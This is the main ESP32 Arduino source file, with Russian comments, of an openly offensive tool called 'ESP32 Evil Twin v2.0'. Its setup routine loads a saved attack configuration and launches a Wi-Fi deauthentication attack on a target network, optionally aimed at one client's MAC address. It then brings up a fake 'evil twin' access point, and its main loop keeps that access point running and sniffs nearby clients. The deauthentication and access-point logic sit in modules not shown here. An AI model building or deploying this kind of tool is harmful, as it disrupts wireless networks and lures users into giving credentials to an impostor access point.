#include <Arduino.h>
#include <WiFi.h>
#include "config.h"
#include "wifi_attack.h"
#include "web_server.h"
#include "monitoring.h"
#include "memory_manager.h"
#include "hardware_detection.h"

void setup() {
    Serial.begin(115200);
    delay(1000);

    // Динамическое определение и настройка оборудования
    Serial.println("=== Hardware Detection & Auto-Configuration ===");

    // Инициализируем динамические константы значениями по умолчанию
    initializeDynamicConstants();

    // Определяем оборудование
    if (!HardwareDetection::detectHardware()) {
        Serial.println("CRITICAL: Hardware detection failed!");
        while(1) delay(1000);
    }

    // Выводим информацию об оборудовании
    HardwareDetection::printHardwareInfo();

    // Автоматическая настройка на основе обнаруженного оборудования
    AutoConfigurator::autoDetectAndConfigure();

    // Выводим примененную конфигурацию
    AutoConfigurator::printConfiguration();

    // Инициализация менеджера памяти с динамическими настройками
    if (!MemoryManager::getInstance()->init()) {
        Serial.println("CRITICAL: MemoryManager initialization failed!");
        while(1) delay(1000);
    }

    // Инициализация системы мониторинга
    if (!systemMonitor.init()) {
        Serial.println("CRITICAL: SystemMonitor initialization failed!");
        while(1) delay(1000);
    }

    LOG_SYSTEM(LOG_INFO, "=== ESP32 Evil Twin v2.0 Starting ===");
    LOG_SYSTEM(LOG_INFO, "Free heap: " + String(ESP.getFreeHeap()) + " bytes");

    // Инициализация всех менеджеров
    if (!configManager.init()) {
        LOG_SYSTEM(LOG_ERROR, "ConfigManager initialization failed!");
        while(1) delay(1000);
    }

    if (!wifiAttackManager.init()) {
        LOG_SYSTEM(LOG_ERROR, "WiFiAttackManager initialization failed!");
        while(1) delay(1000);
    }

    if (!webServerManager.init()) {
        LOG_SYSTEM(LOG_ERROR, "WebServerManager initialization failed!");
        while(1) delay(1000);
    }

    // Проверка конфигурации атаки
    bool config_valid = false;
    if (EEPROM.read(0) == 'Y' && configManager.loadConfig()) {
        config_valid = true;
        currentState = STATE_ATTACK;
        LOG_CONFIG(LOG_INFO, "Valid attack config found in EEPROM");
    } else {
        if (EEPROM.read(0) == 'Y') {
            LOG_CONFIG(LOG_WARN, "Attack config in EEPROM is corrupted! Starting in setup mode.");
        }
        currentState = STATE_SETUP;
    }

    if (currentState == STATE_ATTACK && config_valid) {
        // Сброс флага атаки в EEPROM
        EEPROM.write(0, 'N');
        if (!EEPROM.commit()) {
            logMessage(LOG_ERROR, "Failed to update EEPROM");
        }

        AttackConfig config;
        if (configManager.getConfig(config)) {
            LOG_ATTACK(LOG_INFO, "Starting attack mode for target: " + String(config.target_ssid));

            uint8_t client_mac_arr[6] = {0};
            bool unicast_attack = false;
            if (strlen(config.target_client_mac) > 0 &&
                ConfigManager::isValidMacAddress(config.target_client_mac)) {
                if (ConfigManager::parseMac(config.target_client_mac, client_mac_arr)) {
                    unicast_attack = true;
                    LOG_ATTACK(LOG_INFO, "Unicast attack mode enabled");
                }
            }

            wifiAttackManager.performDeauthAttack(config.deauth_duration_ms, unicast_attack ? client_mac_arr : nullptr);
            webServerManager.startEvilTwin(config);
        }
    } else {
        LOG_SYSTEM(LOG_INFO, "Starting setup mode");
        webServerManager.startSetupMode();
    }

    LOG_SYSTEM(LOG_INFO, "Setup completed. Free heap: " + String(ESP.getFreeHeap()) + " bytes");
}

void loop() {
    static unsigned long last_monitoring_update = 0;
    static unsigned long monitoring_interval = 5000; // Обновление мониторинга каждые 5 секунд
    static unsigned long last_alert_check = 0;
    static unsigned long alert_check_interval = 30000; // Проверка алертов каждые 30 секунд

    // Обновление метрик системы
    systemMonitor.updateMetrics();

    // Периодическая проверка алертов
    if (millis() - last_alert_check > alert_check_interval) {
        systemMonitor.checkAlerts();
        last_alert_check = millis();
    }

    // Обработка веб-сервера
    webServerManager.handleLoop();

    // Обработка сниффинга клиентов (только в режиме настройки)
    if (currentState == STATE_SETUP) {
        wifiAttackManager.processSnifferQueue();
    }

    // Проверка состояния WiFi в режиме атаки
    if (currentState == STATE_ATTACK && WiFi.getMode() != WIFI_AP) {
        LOG_WIFI(LOG_WARN, "WiFi mode changed unexpectedly, restoring AP mode");
        WiFi.mode(WIFI_AP);
    }

    // Периодическая очистка старых данных
    static unsigned long last_cleanup = 0;
    if (millis() - last_cleanup > 3600000) { // Каждый час
        systemMonitor.cleanup();
        last_cleanup = millis();
        LOG_SYSTEM(LOG_INFO, "Performed periodic cleanup");
    }

    // Периодическая оптимизация памяти
    static unsigned long last_memory_check = 0;
    if (millis() - last_memory_check > 300000) { // Каждые 5 минут
        MemoryManager::getInstance()->updateStats();

        if (!MemoryManager::getInstance()->isMemoryHealthy()) {
            LOG_SYSTEM(LOG_WARN, "Memory health check failed, performing garbage collection");
            MemoryManager::getInstance()->forceGarbageCollection();
        }

        last_memory_check = millis();
    }

    // Небольшая задержка для предотвращения перегрузки CPU
    delay(10);
}

// Все функции веб-сервера перенесены в WebServerManager

// Все функции перенесены в соответствующие модули
